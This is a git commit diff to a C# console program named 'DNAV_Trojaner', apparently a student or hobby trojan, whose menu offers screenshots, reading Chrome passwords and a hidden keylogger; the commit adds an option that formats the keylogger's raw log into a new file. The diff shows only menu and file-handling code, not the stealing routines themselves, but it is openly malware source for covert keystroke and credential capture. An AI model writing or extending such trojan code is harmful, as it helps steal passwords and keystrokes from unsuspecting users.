930a7bada9b3528041a1e9e708742c7dd75ad3e2
Sebastian Wittmann <sebastian.wittmann97@web.de>
2019-11-08 09:00:16 +0100

    added menu entry for raw log compiler

--- DNAV_Trojaner/Program.cs
+++ DNAV_Trojaner/Program.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 
 namespace DNAV_Trojaner
 {
@@ -18,6 +19,7 @@ namespace DNAV_Trojaner
                 Console.WriteLine("\n\t(5) Screenshot");
                 Console.WriteLine("\n\t(6) Chrome Passwörter auslesen");
                 Console.WriteLine("\n\t(7) Keylogger aktivieren und Fenster verstecken");
+                Console.WriteLine("\t(8) Keylogger Output formatieren");
                 Console.WriteLine("\n\t(0) Exit");
                 Console.Write("\n\t> ");
                 input = Console.ReadLine();
@@ -52,6 +54,15 @@ namespace DNAV_Trojaner
                     case "7":
                         Keylogger.Hide();
                         Keylogger.EnableWithLog("log.txt");    
+                        break;
+                    case "8":
+                        StreamReader sr = new StreamReader("log.txt");
+                        string raw = sr.ReadToEnd();
+                        sr.Close();
+                        string compiledOutput = Keylogger.CompileRawOutput(raw);
+                        StreamWriter sw = new StreamWriter("newLog.txt");
+                        sw.WriteLine(compiledOutput);
+                        sw.Close();
                         break;
                 }
             } while (input != "0");
